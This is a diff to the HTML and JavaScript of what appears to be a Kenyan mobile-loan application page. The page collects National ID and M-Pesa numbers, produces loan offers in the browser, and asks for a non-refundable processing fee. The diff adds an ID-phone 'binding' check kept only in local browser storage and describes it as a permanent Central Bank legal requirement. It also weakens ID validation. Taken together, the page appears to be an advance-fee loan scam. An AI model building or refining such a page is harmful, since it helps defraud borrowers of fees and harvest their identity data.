@@ -89,6 +89,24 @@
             display: none;
         }
         
+        .binding-error {
+            background: #fee2e2;
+            border: 1px solid #fecaca;
+            color: #991b1b;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 0.95em;
+            border-left: 4px solid #dc2626;
+            display: none;
+        }
+        
+        .binding-error strong {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+        
         .verification-notice {
             background: #fef3c7;
             border: 1px solid #fde68a;
@@ -856,19 +874,25 @@
         <div class="form-section">
             <div class="form-group">
                 <label>National ID Number</label>
-                <input type="text" id="idNumber" placeholder="Enter your ID number" oninput="validateIdNumber(); checkExistingUser()">
-                <div class="validation-message" id="idValidation">Please enter a valid ID number (5-10 digits)</div>
+                <input type="text" id="idNumber" placeholder="Enter your ID number (digits only)" oninput="validateIdNumber(); checkIdPhoneBinding()">
+                <div class="validation-message" id="idValidation">Please enter numbers only</div>
             </div>
             
             <div class="form-group">
                 <label>M-Pesa Registered Number</label>
-                <input type="tel" id="phoneNumber" placeholder="e.g., 0712345678" maxlength="10" oninput="validatePhoneNumber(); checkExistingUser()">
+                <input type="tel" id="phoneNumber" placeholder="e.g., 0712345678" maxlength="10" oninput="validatePhoneNumber(); checkIdPhoneBinding()">
                 <div class="validation-message" id="phoneValidation">Please enter a valid Kenyan phone number (07... or 01...)</div>
+            </div>
+            
+            <!-- ID-Phone Binding Error Message -->
+            <div class="binding-error" id="bindingError">
+                <strong>⚠️ Identity Mismatch Detected</strong>
+                <p id="bindingErrorMessage"></p>
             </div>
             
             <div class="verification-notice">
                 <strong>🔐 Important Verification Required</strong>
-                <p>The phone number you enter MUST be registered under your name exactly as it appears on your ID. This is required by Central Bank regulations and protects you from fraud. Mismatched details will result in automatic application rejection.</p>
+                <p>The phone number you enter MUST be registered under your name exactly as it appears on your ID. This is required by Central Bank regulations and protects you from fraud. Each ID can only be linked to one phone number.</p>
             </div>
             
             <div class="consent-box">
@@ -961,7 +985,7 @@
             <p><strong>1. Fair Lending:</strong> We adhere to Central Bank of Kenya guidelines on responsible lending. Our interest rates are transparent with no hidden fees.</p>
             <p><strong>2. Flexible Repayment:</strong> You can choose repayment periods from 1 to 12 months. Early repayment incurs no penalties - you only pay interest for days utilized.</p>
             <p><strong>3. Interest Calculation:</strong> Interest is calculated on reducing balance method, ensuring you pay less as you repay.</p>
-            <p><strong>4. Verification:</strong> Your ID and phone number must match. This is a legal requirement to prevent fraud and money laundering.</p>
+            <p><strong>4. Verification:</strong> Your ID and phone number must match and be permanently linked. This is a legal requirement to prevent fraud and money laundering.</p>
             <p><strong>5. Processing Fee:</strong> One-time non-refundable fee covers credit bureau checks, verification, and administrative costs.</p>
             <p><strong>6. Data Protection:</strong> Your data is encrypted and protected under the Kenya Data Protection Act 2019.</p>
             <p><strong>7. Cooling Off Period:</strong> You have 14 days to cancel without penalty as per Kenyan consumer protection laws.</p>
@@ -1150,6 +1174,11 @@
 
         // User database for cross-device consistency
         let userDatabase = JSON.parse(localStorage.getItem('scb_user_database')) || {};
+        // Phone-to-ID mapping database (to enforce one phone per ID)
+        let phoneToIdMap = JSON.parse(localStorage.getItem('scb_phone_to_id')) || {};
+        // ID-to-phone mapping database (to enforce one ID per phone)
+        let idToPhoneMap = JSON.parse(localStorage.getItem('scb_id_to_phone')) || {};
+        
         const deviceFingerprint = generateDeviceFingerprint();
         
         let currentUserKey = null;
@@ -1160,6 +1189,7 @@
         let selectedTenure = 3;
         let isScanning = false;
         let scanInterval;
+        let isBindingValid = true;
         
         // Fixed loan options
         const loanOptions = [
@@ -1191,9 +1221,87 @@
         });
         localStorage.setItem('scb_applications', JSON.stringify(applications));
 
-        // ================ FIXED: Validation Functions with 5-10 digit ID ================
+        // ================ ID-Phone Binding Functions ================
         
-        // Validate ID number (numbers only, 5-10 digits to accommodate all Kenyan IDs)
+        function checkIdPhoneBinding() {
+            const idNumber = document.getElementById('idNumber').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const bindingError = document.getElementById('bindingError');
+            const errorMessage = document.getElementById('bindingErrorMessage');
+            
+            // Reset binding valid flag
+            isBindingValid = true;
+            bindingError.style.display = 'none';
+            
+            // Only check if both fields have values
+            if (!idNumber || !phoneNumber) {
+                checkScanEligibility();
+                return;
+            }
+            
+            // Check if this ID is already linked to a different phone
+            if (idToPhoneMap[idNumber] && idToPhoneMap[idNumber] !== phoneNumber) {
+                isBindingValid = false;
+                errorMessage.innerHTML = `This ID number is already registered with phone number <strong>${idToPhoneMap[idNumber]}</strong>. Each ID can only be linked to one phone number.`;
+                bindingError.style.display = 'block';
+                checkScanEligibility();
+                return;
+            }
+            
+            // Check if this phone is already linked to a different ID
+            if (phoneToIdMap[phoneNumber] && phoneToIdMap[phoneNumber] !== idNumber) {
+                isBindingValid = false;
+                errorMessage.innerHTML = `This phone number is already registered with ID <strong>${phoneToIdMap[phoneNumber]}</strong>. Each phone can only be linked to one ID.`;
+                bindingError.style.display = 'block';
+                checkScanEligibility();
+                return;
+            }
+            
+            // If we have a user in the database with this ID, check if phone matches
+            const userKey = `user_${idNumber}_${phoneNumber}`;
+            if (userDatabase[userKey]) {
+                // This exact combo exists - all good
+                checkScanEligibility();
+                return;
+            }
+            
+            // Check if there's a user with same ID but different phone
+            const existingIdUser = Object.values(userDatabase).find(u => u.idNumber === idNumber);
+            if (existingIdUser && existingIdUser.phoneNumber !== phoneNumber) {
+                isBindingValid = false;
+                errorMessage.innerHTML = `This ID number is already registered with phone number <strong>${existingIdUser.phoneNumber}</strong>. Please use that phone number.`;
+                bindingError.style.display = 'block';
+                checkScanEligibility();
+                return;
+            }
+            
+            // Check if there's a user with same phone but different ID
+            const existingPhoneUser = Object.values(userDatabase).find(u => u.phoneNumber === phoneNumber);
+            if (existingPhoneUser && existingPhoneUser.idNumber !== idNumber) {
+                isBindingValid = false;
+                errorMessage.innerHTML = `This phone number is already registered with ID <strong>${existingPhoneUser.idNumber}</strong>. Please use that ID number.`;
+                bindingError.style.display = 'block';
+                checkScanEligibility();
+                return;
+            }
+            
+            checkScanEligibility();
+        }
+        
+        // Bind ID and phone together permanently
+        function bindIdAndPhone(idNumber, phoneNumber) {
+            // Store the binding in both maps
+            idToPhoneMap[idNumber] = phoneNumber;
+            phoneToIdMap[phoneNumber] = idNumber;
+            
+            // Save to localStorage
+            localStorage.setItem('scb_id_to_phone', JSON.stringify(idToPhoneMap));
+            localStorage.setItem('scb_phone_to_id', JSON.stringify(phoneToIdMap));
+        }
+
+        // ================ Validation Functions ================
+        
+        // Validate ID number - just ensure it contains only digits and at least 1 digit
         function validateIdNumber() {
             const idInput = document.getElementById('idNumber');
             const idValue = idInput.value;
@@ -1201,12 +1309,14 @@
             
             // Remove any non-numeric characters
             const numericValue = idValue.replace(/[^0-9]/g, '');
+            
+            // Update input with cleaned value
             if (idValue !== numericValue) {
                 idInput.value = numericValue;
             }
             
-            // Check if it's a valid ID (5-10 digits, all numbers)
-            const isValid = /^\d{5,10}$/.test(numericValue);
+            // Check if it contains at least one digit
+            const isValid = numericValue.length > 0;
             
             if (numericValue.length > 0 && !isValid) {
                 idInput.classList.add('error');
@@ -1216,7 +1326,6 @@
                 validationMsg.style.display = 'none';
             }
             
-            checkScanEligibility();
             return isValid;
         }
         
@@ -1242,23 +1351,23 @@
                 validationMsg.style.display = 'none';
             }
             
-            checkScanEligibility();
             return isValid;
         }
         
-        // Check scan eligibility
+        // Check scan eligibility - now includes binding validation
         function checkScanEligibility() {
             const idNumber = document.getElementById('idNumber').value.trim();
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             const consentGiven = document.getElementById('consentCheckbox').checked;
             const scanBtn = document.getElementById('scanBtn');
             
-            // Validate ID format (5-10 digits)
-            const isValidId = /^\d{5,10}$/.test(idNumber);
+            // ID just needs at least 1 digit
+            const isValidId = idNumber.length > 0;
             // Validate phone format
             const isValidPhone = /^(07|01)\d{8}$/.test(phoneNumber);
             
-            scanBtn.disabled = !(isValidId && isValidPhone && consentGiven);
+            // Only enable if all validations pass including binding
+            scanBtn.disabled = !(isValidId && isValidPhone && consentGiven && isBindingValid);
         }
 
         // ================ User Identity Functions ================
@@ -1291,6 +1400,20 @@
                 return userDatabase[userKey];
             }
             
+            // Check if this ID is already used with different phone
+            const existingIdUser = Object.values(userDatabase).find(u => u.idNumber === idNumber);
+            if (existingIdUser) {
+                console.log('ID already used with different phone');
+                return null;
+            }
+            
+            // Check if this phone is already used with different ID
+            const existingPhoneUser = Object.values(userDatabase).find(u => u.phoneNumber === phoneNumber);
+            if (existingPhoneUser) {
+                console.log('Phone already used with different ID');
+                return null;
+            }
+            
             // New user - create consistent loan offer
             console.log('New user, creating consistent offer for:', userKey);
             
@@ -1310,6 +1433,9 @@
             userDatabase[userKey] = loanData;
             localStorage.setItem('scb_user_database', JSON.stringify(userDatabase));
             
+            // Permanently bind this ID and phone together
+            bindIdAndPhone(idNumber, phoneNumber);
+            
             return loanData;
         }
         
@@ -1319,10 +1445,14 @@
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             
             // Only proceed if both fields have valid formats
-            const isValidId = /^\d{5,10}$/.test(idNumber);
+            const isValidId = idNumber.length > 0;
             const isValidPhone = /^(07|01)\d{8}$/.test(phoneNumber);
             
             if (!isValidId || !isValidPhone) return;
+            
+            // Check binding first
+            checkIdPhoneBinding();
+            if (!isBindingValid) return;
             
             // Get or create user identity (this ensures consistency)
             const userData = getUserIdentity(idNumber, phoneNumber);
@@ -1405,7 +1535,7 @@
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             
             // Validate formats
-            const isValidId = /^\d{5,10}$/.test(idNumber);
+            const isValidId = idNumber.length > 0;
             const isValidPhone = /^(07|01)\d{8}$/.test(phoneNumber);
             
             if (!isValidId || !isValidPhone) {
@@ -1413,11 +1543,18 @@
                 return;
             }
             
+            // Check binding again
+            checkIdPhoneBinding();
+            if (!isBindingValid) {
+                alert('Cannot proceed due to ID-phone mismatch');
+                return;
+            }
+            
             // Get or create user data (this ensures consistency)
             const userData = getUserIdentity(idNumber, phoneNumber);
             
             if (!userData) {
-                alert('Error processing your information. Please try again.');
+                alert('Error processing your information. This ID or phone may already be registered with different details.');
                 return;
             }
             
@@ -1519,7 +1656,7 @@
             const applyBtn = document.getElementById('applyBtn');
             const hasScanned = sessionStorage.getItem('hasScanned') === 'true';
             
-            applyBtn.disabled = !(acceptTnc.checked && hasScanned && qualifiedAmount > 0);
+            applyBtn.disabled = !(acceptTnc.checked && hasScanned && qualifiedAmount > 0 && isBindingValid);
         }
         
         function openPaymentModal() {
@@ -1532,6 +1669,11 @@
             
             if (qualifiedAmount === 0) {
                 alert('Please check your eligibility first');
+                return;
+            }
+            
+            if (!isBindingValid) {
+                alert('Cannot proceed due to ID-phone mismatch');
                 return;
             }
             
@@ -1567,7 +1709,7 @@
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             
             // Validate formats again
-            const isValidId = /^\d{5,10}$/.test(idNumber);
+            const isValidId = idNumber.length > 0;
             const isValidPhone = /^(07|01)\d{8}$/.test(phoneNumber);
             
             if (!isValidId || !isValidPhone) {
@@ -1575,11 +1717,16 @@
                 return;
             }
             
+            if (!isBindingValid) {
+                alert('Cannot proceed due to ID-phone mismatch');
+                return;
+            }
+            
             // Ensure we have the user data
             const userData = getUserIdentity(idNumber, phoneNumber);
             
             if (!userData) {
-                alert('Error: User data not found. Please try again.');
+                alert('Error: User data not found. This ID or phone may be registered with different details.');
                 return;
             }
             
@@ -1770,4 +1917,4 @@
         });
     </script>
 </body>
-                                                                                    </html>
+    </html>
